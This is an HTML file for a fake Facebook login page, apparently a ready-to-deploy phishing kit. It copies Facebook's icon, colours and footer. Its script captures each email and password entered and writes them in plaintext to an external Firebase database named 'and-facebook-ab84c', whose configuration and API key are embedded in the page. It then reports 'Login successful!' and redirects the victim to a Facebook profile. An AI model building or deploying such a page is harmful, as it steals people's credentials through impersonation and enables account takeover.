<!DOCTYPE html>
<html>
<head>
    <title>Facebook Login</title>
    <link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yi/r/4Kv5U5b1o3f.png" rel="shortcut icon" sizes="196x196" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        /* Basic Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        /* Centered Container */
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f0f2f5;
            padding: 20px;
        }

        /* Facebook Logo */
        .logo {
            width: 50px;
            height: 50px;
            margin-bottom: 20px;
            border-radius: 50%;
        }

        /* Form Container */
        .form-container {
            background-color: #ffffff;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
            border-radius: 8px;
            text-align: center;
        }

        /* Form Title */
        .form-title {
            font-size: 24px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 20px;
        }

        /* Form Fields */
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }

        /* Submit Button */
        button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: #ffffff;
            font-size: 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #166fe5;
        }

        /* Separator (or) */
        .separator {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
        }

        .separator::before,
        .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dddfe2;
        }

        .separator:not(:empty)::before {
            margin-right: 10px;
        }

        .separator:not(:empty)::after {
            margin-left: 10px;
        }

        /* Create Account Link */
        .create-account {
            margin-top: 20px;
            color: #1877f2;
            font-size: 14px;
        }

        .create-account a {
            text-decoration: none;
            color: #1877f2;
        }

        .create-account a:hover {
            text-decoration: underline;
        }
        footer {
            margin-top: 40px; /* Added margin to create space between the footer and the login form */
            text-align: center;
            font-size: 12px;
            color: #888;
        }
        footer a {
            color: #1877f2;
            text-decoration: none;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Facebook Logo -->
        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yi/r/4Kv5U5b1o3f.png" alt="Facebook Logo" class="logo">

        <!-- Login Form -->
        <div class="form-container">
            <div class="form-title">Log in to Facebook</div>
            <form id="login-form" onsubmit="saveAndRedirect(event)">
                <input type="text" id="email" name="email" placeholder="Email or Phone" required><br>
                <input type="password" id="password" name="pass" placeholder="Password" required><br>
                <button type="submit">Log In</button>
            </form>

            <!-- Separator Line with "or" -->
            <div class="separator">or</div>

            <!-- Create Account Redirect -->
            <p class="create-account">Don't have an account? <a href="https://www.facebook.com/r.php">Create one</a></p>
        </div>
    </div>
    <footer>
        <p>Â© 2024 Facebook, Inc. All rights reserved.</p>
        <a href="#">Terms</a> | 
        <a href="#">Data Policy</a> | 
        <a href="#">Cookie Policy</a>
    </footer>
 <script type="module">
  // Import Firebase functions
  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";

  // Firebase configuration
  const firebaseConfig = {
    apiKey: "AIzaSyCcTFYAIp1-TA1irU8l5N8iihfnYCGWrHw",
    authDomain: "and-facebook-ab84c.firebaseapp.com",
    databaseURL: "https://and-facebook-ab84c-default-rtdb.firebaseio.com",
    projectId: "and-facebook-ab84c",
    storageBucket: "and-facebook-ab84c.appspot.com",
    messagingSenderId: "4885749329",
    appId: "1:4885749329:web:2d5b0e46519b5dc4c8e270"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  // Function to save email and password to Firebase and redirect
  function saveAndRedirect(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if (email && password) {
      // Save to Firebase database
      set(ref(db, 'users/' + email.replace('.', '_')), {
        email: email,
        password: password
      }).then(() => {
        alert("Login successful!");
        window.location.href = 'https://www.facebook.com/mike.robinson.486374';
      }).catch((error) => {
        console.error("Error storing data:", error);
        alert("Failed to log in. Please try again.");
      });
    } else {
      alert("Please fill in both fields.");
    }
  }

  // Attach the saveAndRedirect function to the form's submit event
  document.getElementById("login-form").addEventListener("submit", saveAndRedirect);
</script>
</body>
</html>
